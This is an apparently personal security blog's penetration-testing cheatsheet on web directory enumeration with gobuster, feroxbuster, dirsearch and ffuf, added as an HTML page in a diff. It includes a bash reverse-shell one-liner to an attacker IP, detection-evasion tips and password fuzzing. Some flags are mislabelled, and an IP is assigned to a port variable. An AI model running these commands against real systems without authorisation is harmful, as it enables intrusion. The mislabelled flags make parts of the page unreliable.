@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Web Directory Enumeration Cheatsheet | realspaceeagle</title>
+<meta name="keywords" content="web-enumeration, gobuster, feroxbuster, directory-brute-force, web-security">
+<meta name="description" content="Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools">
+<meta name="author" content="realspaceeagle">
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<meta name="description" content="Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools">
+<meta name="keywords" content="web-enumeration, gobuster, feroxbuster, directory-brute-force, web-security">
+<meta name="author" content="realspaceeagle">
+<meta name="robots" content="index, follow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<link rel="canonical" href="https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/">
+
+
+<meta property="og:title" content="Web Directory Enumeration Cheatsheet - realspaceeagle">
+<meta property="og:description" content="Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools">
+<meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/">
+<meta property="og:site_name" content="realspaceeagle">
+<meta property="og:locale" content="en_US"><meta property="og:type" content="article">
+<meta property="article:author" content="realspaceeagle"><meta property="article:published_time" content="2024-01-01T00:00:00Z"><meta property="article:modified_time" content="2024-01-01T00:00:00Z"><meta property="article:tag" content="web-enumeration"><meta property="article:tag" content="gobuster"><meta property="article:tag" content="feroxbuster"><meta property="article:tag" content="directory-brute-force"><meta property="article:tag" content="web-security"><meta property="article:section" content="cheatsheets"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta property="og:image:alt" content="realspaceeagle">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@haran_loga">
+<meta name="twitter:creator" content="@haran_loga">
+<meta name="twitter:title" content="Web Directory Enumeration Cheatsheet - realspaceeagle">
+<meta name="twitter:description" content="Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools"><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta name="twitter:image:alt" content="realspaceeagle"><meta name="article:author" content="realspaceeagle">
+<meta name="article:publisher" content="https://realspaceeagle.github.io/"><meta name="news_keywords" content="web-enumeration, gobuster, feroxbuster, directory-brute-force, web-security">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org","@type": "BlogPosting",
+  "headline": "Web Directory Enumeration Cheatsheet",
+  "description": "Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools",
+  "author": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "description": "Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  },
+  "datePublished": "2024-01-01T00:00:00Z","dateModified": "2024-01-01T00:00:00Z","url": "https:\/\/realspaceeagle.github.io\/cheatsheets\/web-directory-enumeration\/",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/realspaceeagle.github.io\/cheatsheets\/web-directory-enumeration\/"
+  },"image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/realspaceeagle.github.io\/images\/og-image.svg",
+    "width": 1200,
+    "height": 630
+  },"keywords": "web-enumeration, gobuster, feroxbuster, directory-brute-force, web-security",
+  "articleSection": "cheatsheets",
+  "wordCount":  1135 ,
+  "genre": ["Cybersecurity", "Technology", "Education"],
+  "about": [{
+      "@type": "Thing",
+      "name": "web-enumeration"
+    },{
+      "@type": "Thing",
+      "name": "gobuster"
+    },{
+      "@type": "Thing",
+      "name": "feroxbuster"
+    },{
+      "@type": "Thing",
+      "name": "directory-brute-force"
+    },{
+      "@type": "Thing",
+      "name": "web-security"
+    }]}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https:\/\/realspaceeagle.github.io\/"
+    },{
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cheatsheets",
+      "item": "https:\/\/realspaceeagle.github.io\/categories\/cheatsheets\/"
+    },{
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Web Directory Enumeration Cheatsheet",
+      "item": "https:\/\/realspaceeagle.github.io\/cheatsheets\/web-directory-enumeration\/"
+    }]
+}
+</script>
+
+
+<link rel="stylesheet" href="/css/terminal-style.css">
+
+
+<link rel="stylesheet" href="/css/scroll-enhancement.css">
+
+
+<link rel="stylesheet" href="/css/mobile-navigation.css">
+
+
+<link rel="stylesheet" href="/css/mobile-responsive-pages.css">
+
+
+<link rel="stylesheet" href="/css/header-width-fix.css">
+
+
+<link rel="stylesheet" href="/css/share-buttons.css">
+
+
+<link rel="stylesheet" href="/css/comments.css">
+
+
+<link rel="stylesheet" href="/css/blog-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/blog-sidebar.css">
+
+
+<link rel="stylesheet" href="/css/project-toggle.css">
+
+
+<link rel="stylesheet" href="/css/code-copy-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/ctf-writeup.css">
+
+
+<link rel="stylesheet" href="/css/github-stats.css">
+
+
+<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
+<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>
+
+
+<script src="/js/github-calendar-enhanced.js" defer></script>
+
+
+<script src="/js/github-contribution-tracker.js" defer></script>
+
+
+<script src="/js/github-api-fallback.js" defer></script>
+
+
+<script src="/js/github-integration.js" defer></script>
+
+
+<script src="/js/twitter-timeline.js" defer></script>
+<script src="/js/twitter-manual.js" defer></script>
+
+
+<script src="/js/code-copy-enhanced.js" defer></script>
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-GPTRZ14YZS');
+        }
+      </script><meta property="og:url" content="https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/">
+  <meta property="og:site_name" content="realspaceeagle">
+  <meta property="og:title" content="Web Directory Enumeration Cheatsheet">
+  <meta property="og:description" content="Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cheatsheets">
+    <meta property="article:published_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-01-01T00:00:00+00:00">
+    <meta property="article:tag" content="Web-Enumeration">
+    <meta property="article:tag" content="Gobuster">
+    <meta property="article:tag" content="Feroxbuster">
+    <meta property="article:tag" content="Directory-Brute-Force">
+    <meta property="article:tag" content="Web-Security">
+      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:title" content="Web Directory Enumeration Cheatsheet">
+<meta name="twitter:description" content="Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Security Cheatsheets",
+      "item": "https://realspaceeagle.github.io/cheatsheets/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Web Directory Enumeration Cheatsheet",
+      "item": "https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Web Directory Enumeration Cheatsheet",
+  "name": "Web Directory Enumeration Cheatsheet",
+  "description": "Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools",
+  "keywords": [
+    "web-enumeration", "gobuster", "feroxbuster", "directory-brute-force", "web-security"
+  ],
+  "articleBody": "Web Directory Enumeration Cheatsheet Initial Setup and Preparation Environment Variables Setup # Set up common environment variables for pentesting export LPORT=10.10.14.13 # Your attacking machine IP export RPORT=10.10.11.194 # Target machine IP export LHOST=10.10.14.13 # Alternative naming export RHOST=10.10.11.194 # Alternative naming # Use in commands nc -nlvp $LPORT bash -i \u003e\u0026 /dev/tcp/$LPORT/9001 0\u003e\u00261 Host File Modification # Add target to hosts file for virtual host testing sudo nano /etc/hosts # Example entries 10.10.11.194 soccer.htb 10.10.11.194 soccer.htb soc-player.soccer.htb # Alternative using echo echo \"10.10.11.194 soccer.htb\" | sudo tee -a /etc/hosts echo \"10.10.11.194 soc-player.soccer.htb\" | sudo tee -a /etc/hosts # Verify hosts file entries cat /etc/hosts | grep htb Target Information Gathering # Ping test connectivity ping -c 4 $RHOST ping -c 4 soccer.htb # Quick port check nc -zv $RHOST 80 nc -zv $RHOST 443 # DNS resolution check nslookup soccer.htb dig soccer.htb Gobuster Basic Directory Enumeration # Basic directory enumeration gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt # With specific extensions gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt # Output to file gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster # Common comprehensive scan gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster Advanced Gobuster Options # Include status codes gobuster dir -u http://target.com -w wordlist.txt -s \"200,204,301,302,307,403\" # Set custom User-Agent gobuster dir -u http://target.com -w wordlist.txt -a \"Mozilla/5.0 (Custom Agent)\" # Add cookies gobuster dir -u http://target.com -w wordlist.txt -c \"sessionid=abc123\" # Add headers gobuster dir -u http://target.com -w wordlist.txt -H \"Authorization: Bearer token123\" # Proxy through Burp gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080 # Recursive enumeration gobuster dir -u http://target.com -w wordlist.txt -r # Follow redirects gobuster dir -u http://target.com -w wordlist.txt -f Gobuster Modes # Directory mode (default) gobuster dir -u http://target.com -w wordlist.txt # DNS subdomain enumeration gobuster dns -d target.com -w subdomains.txt # Virtual host enumeration gobuster vhost -u http://target.com -w vhosts.txt # S3 bucket enumeration gobuster s3 -w bucket-names.txt Feroxbuster Basic Usage # Basic directory scan feroxbuster -u http://target.com # With wordlist feroxbuster -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt # Medium directory scan feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt Advanced Feroxbuster Features # Multiple extensions feroxbuster -u http://target.com -x php,html,txt,js # Specific depth feroxbuster -u http://target.com --depth 4 # Rate limiting feroxbuster -u http://target.com --rate-limit 10 # Custom threads feroxbuster -u http://target.com -t 50 # Filter status codes feroxbuster -u http://target.com -C 404,403 # Filter response size feroxbuster -u http://target.com -S 1234 # Resume scan feroxbuster --resume-from state.toml Feroxbuster Output Options # JSON output feroxbuster -u http://target.com -o results.json # Silent mode feroxbuster -u http://target.com --silent # Extract links for further enumeration feroxbuster -u http://target.com --extract-links # Random delay between requests feroxbuster -u http://target.com --random-agent Dirsearch Basic Commands # Basic scan dirsearch -u http://target.com # With extensions dirsearch -u http://target.com -e php,html,js # Custom wordlist dirsearch -u http://target.com -w custom-wordlist.txt # Recursive scan dirsearch -u http://target.com -r # Save results dirsearch -u http://target.com --format=simple -o results.txt Ffuf Directory Fuzzing # Basic directory fuzzing ffuf -w wordlist.txt -u http://target.com/FUZZ # With extensions ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html,.txt # Filter by response code ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302 # Filter by response size ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 1234 # Output to file ffuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json Parameter Fuzzing # GET parameter fuzzing ffuf -w wordlist.txt -u \"http://target.com/search?FUZZ=test\" # POST data fuzzing ffuf -w wordlist.txt -u http://target.com/login -X POST -d \"username=admin\u0026password=FUZZ\" # Header fuzzing ffuf -w wordlist.txt -u http://target.com -H \"X-Forwarded-For: FUZZ\" Wordlists SecLists Common Paths # Small wordlists (fast) /opt/SecLists/Discovery/Web-Content/raft-small-words.txt /opt/SecLists/Discovery/Web-Content/common.txt # Medium wordlists (comprehensive) /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt # Large wordlists (extensive) /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt # Technology-specific /opt/SecLists/Discovery/Web-Content/spring-boot.txt /opt/SecLists/Discovery/Web-Content/apache.txt /opt/SecLists/Discovery/Web-Content/nginx.txt Custom Wordlist Creation # Extract words from target website cewl http://target.com -w custom-wordlist.txt # Combine wordlists cat wordlist1.txt wordlist2.txt | sort -u \u003e combined.txt # Generate variations # Add common extensions to base words sed 's/$/.php/' base-words.txt \u003e php-files.txt sed 's/$/.html/' base-words.txt \u003e html-files.txt Targeted Enumeration Content Management Systems # WordPress gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt # Drupal gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/drupal.fuzz.txt # Joomla gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/joomla.fuzz.txt File Extensions by Technology # PHP applications gobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml # ASP/ASP.NET applications gobuster dir -u http://target.com -w wordlist.txt -x asp,aspx,asmx,ashx # JSP applications gobuster dir -u http://target.com -w wordlist.txt -x jsp,jspa,jspx # Python applications gobuster dir -u http://target.com -w wordlist.txt -x py,pyc,pyo # Common web files gobuster dir -u http://target.com -w wordlist.txt -x html,htm,js,css,xml,json Backup and Sensitive Files # Common backup extensions gobuster dir -u http://target.com -w wordlist.txt -x bak,backup,old,orig,tmp # Configuration files gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt # Database files gobuster dir -u http://target.com -w wordlist.txt -x sql,db,sqlite,mdb Stealth and Evasion Rate Limiting and Timing # Slow scan to avoid detection gobuster dir -u http://target.com -w wordlist.txt --delay 100ms # Random User-Agent rotation feroxbuster -u http://target.com --random-agent # Custom User-Agent gobuster dir -u http://target.com -w wordlist.txt -a \"Mozilla/5.0 (Googlebot)\" # Proxy rotation gobuster dir -u http://target.com -w wordlist.txt -p http://proxy1:8080 Request Modification # Add realistic headers gobuster dir -u http://target.com -w wordlist.txt -H \"Accept: text/html,application/xhtml+xml\" -H \"Accept-Language: en-US,en;q=0.9\" # Session-based enumeration gobuster dir -u http://target.com -w wordlist.txt -c \"PHPSESSID=abc123; auth_token=xyz789\" # Method tampering ffuf -w wordlist.txt -u http://target.com/FUZZ -X POST Analysis and Follow-up Response Analysis # Check for interesting status codes grep -E \"(200|301|302|403)\" gobuster-results.txt # Look for unusual response sizes awk '{print $3, $1}' gobuster-results.txt | sort -n # Extract found directories for further enumeration grep \"Status: 200\" gobuster-results.txt | awk '{print $1}' \u003e found-dirs.txt Automated Follow-up # Recursive enumeration of found directories while read dir; do gobuster dir -u http://target.com$dir -w wordlist.txt -x php,html done \u003c found-dirs.txt # Screenshot found pages while read url; do cutycapt --url=$url --out=screenshots/$(basename $url).png done \u003c found-urls.txt Common Findings and Next Steps Interesting Directories to Investigate /admin/ - Administrative interfaces /backup/ - Backup files and archives /config/ - Configuration files /uploads/ - File upload functionality /api/ - API endpoints /docs/ - Documentation /test/ - Test files and environments /dev/ - Development resources File Types to Prioritize .php, .asp, .jsp - Server-side scripts .config, .ini, .yaml - Configuration files .sql, .db - Database files .log - Log files with potential sensitive data .bak, .old - Backup files .git/, .svn/ - Version control directories Tips and Best Practices Performance Optimization Start with small wordlists for quick wins Use appropriate thread counts (10-50 for most servers) Implement delays for rate-limited or slow servers Use recursive scanning judiciously to avoid infinite loops Detection Avoidance Rotate User-Agents and request headers Implement random delays between requests Use proxy chains for sensitive targets Monitor for rate limiting or blocking responses Coverage Maximization Use multiple tools with different algorithms Combine wordlists for comprehensive coverage Include technology-specific extensions Follow up manual testing on interesting findings Always ensure you have proper authorization before conducting directory enumeration on any target system.\n",
+  "wordCount" : "1135",
+  "inLanguage": "en",
+  "image": "https://realspaceeagle.github.io/images/og-image.svg","datePublished": "2024-01-01T00:00:00Z",
+  "dateModified": "2024-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": {"avatar":"/images/avatar.svg","bio":"Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.","name":"realspaceeagle","title":"Cybersecurity Professional \u0026 Penetration Tester"}
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "realspaceeagle",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://realspaceeagle.github.io/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
+            
+            
+            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+            </button>
+            
+            <div class="logo-switches">
+                
+                <div class="social-icons">
+                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
+                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                        </svg>
+                    </a>
+                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
+                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                        </svg>
+                    </a>
+                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
+                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                        </svg>
+                    </a>
+                </div>
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <ul id="menu" class="desktop-menu">
+            <li>
+                <a href="https://realspaceeagle.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+        
+        
+        <div id="mobile-menu" class="mobile-menu">
+            <ul class="mobile-menu-list">
+                <li>
+                    <a href="https://realspaceeagle.github.io/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                        <span>Archives</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                        <span>Cheatsheets</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
+                        <span>Search</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                        <span>Categories</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                        <span>Projects</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                        <span>Contact</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
+    const mobileMenu = document.getElementById('mobile-menu');
+    const body = document.body;
+    
+    if (mobileMenuToggle && mobileMenu) {
+        mobileMenuToggle.addEventListener('click', function() {
+            const isOpen = mobileMenu.classList.contains('active');
+            
+            if (isOpen) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            } else {
+                mobileMenu.classList.add('active');
+                mobileMenuToggle.classList.add('active');
+                body.classList.add('mobile-menu-open');
+            }
+        });
+        
+        
+        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
+        mobileMenuLinks.forEach(link => {
+            link.addEventListener('click', function() {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            });
+        });
+        
+        
+        document.addEventListener('click', function(event) {
+            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            }
+        });
+    }
+});
+</script><main class="main">
+<link rel="stylesheet" href="/css/cheatsheet-style.css">
+
+<article class="post-single cheatsheet-page">
+  <header class="post-header">
+    <div class="breadcrumbs">
+      <a href="/">Home</a> &nbsp;/&nbsp; <a href="/cheatsheets/">Cheatsheets</a> &nbsp;/&nbsp; Web Directory Enumeration Cheatsheet
+    </div>
+    <h1 class="post-title">
+      Web Directory Enumeration Cheatsheet
+    </h1>
+    <div class="post-description">
+      Comprehensive guide for web directory and file enumeration using gobuster, feroxbuster, and other tools
+    </div>
+    <div class="post-meta">
+      <span title='January 1, 2024'>
+        January 1, 2024
+      </span>
+      <span class="post-tags">
+        <a href="/tags/web-enumeration">#web-enumeration</a>
+        <a href="/tags/gobuster">#gobuster</a>
+        <a href="/tags/feroxbuster">#feroxbuster</a>
+        <a href="/tags/directory-brute-force">#directory-brute-force</a>
+        <a href="/tags/web-security">#web-security</a>
+      </span>
+    </div>
+  </header>
+
+  <div class="post-content"><h1 id="web-directory-enumeration-cheatsheet">Web Directory Enumeration Cheatsheet</h1>
+<h2 id="initial-setup-and-preparation">Initial Setup and Preparation</h2>
+<h3 id="environment-variables-setup">Environment Variables Setup</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Set up common environment variables for pentesting</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LPORT</span><span class="o">=</span>10.10.14.13    <span class="c1"># Your attacking machine IP</span>
